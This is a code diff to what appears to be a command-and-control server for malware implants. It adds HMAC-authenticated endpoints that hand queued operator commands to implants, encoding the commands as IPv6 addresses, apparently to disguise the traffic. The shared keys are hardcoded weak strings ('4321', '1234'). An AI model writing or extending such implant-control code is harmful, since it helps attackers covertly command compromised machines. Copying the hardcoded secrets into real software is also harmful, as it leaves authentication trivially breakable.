@@ -6,6 +6,7 @@ import os
 import socket
 import ssl
 import threading
+import time
 from queue import Queue, Empty
 from threading import Thread
 import secrets
@@ -47,6 +48,31 @@ logging.basicConfig(
     format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S',
 )
+
+
+def verify_auth_token(uri, received_token, received_timestamp):
+    """
+    Verifies HMAC auth tokens sent by clients to verify identity
+    :param uri: The URI that the request came to
+    :param received_token: The HMAC token sent with the request
+    :param received_timestamp: The timestamp that the token was sent
+    :return: bool depending on comparison outcome
+    """
+    secret_key = "4321"
+    time_window = 60  # Allow a 60-second window for token validity
+    # Ensure the timestamp is within the allowed time window
+    current_time = int(time.time())
+    if abs(current_time - int(received_timestamp)) > time_window:
+        logger.error("token past time window")
+        return False
+
+    # Recalculate the HMAC based on the URI and timestamp
+    message = f"{uri}:{received_timestamp}"
+    hmac_obj = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256)
+    computed_token = hmac_obj.hexdigest()
+
+    # Verify the token
+    return hmac.compare_digest(computed_token, received_token)
 
 
 def build_implant(protocol):
@@ -223,6 +249,40 @@ def handle_client(client_socket):
         logger.error(f"Error occurred when trying to receive connection {e}")
     finally:
         client_socket.close()
+
+
+@app.route('/auth/<path:path>', methods=['GET'])
+def authenticated_get(path):
+    """
+    Verifies requests for commands with an HMAC and shared key
+    :param path: This represents the implant ID
+    :return: Either the waiting command or error
+    """
+    rcv_token = request.args.get("token")
+    rcv_timestamp = request.args.get("timestamp")
+    # Get the message FIFO
+    logger.info("GET incoming for authenticated listener URI")
+    if verify_auth_token(path, rcv_token, rcv_timestamp) is True:
+        try:
+            operator, command = get_waiting_command(path)
+            if operator and command is False:
+                logger.error("operator and command in queue are false")
+                return "error"
+            checkout_command(path, operator)
+            command = json.dumps(ipv6_encoder.string_to_ipv6(command))
+            logger.info("sending command and HMAC to implant")
+            hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
+            hmac_sig = hmac_k.hexdigest()
+            return jsonify(
+                message=command,
+                key=hmac_sig
+            )
+        except Exception as e:
+            logger.error(f"error: {e}")
+            return "error"
+    else:
+        logger.error(f"error: verify_auth_token failed")
+        return "error"
 
 
 @app.route('/direct/<path:path>', methods=['GET'])
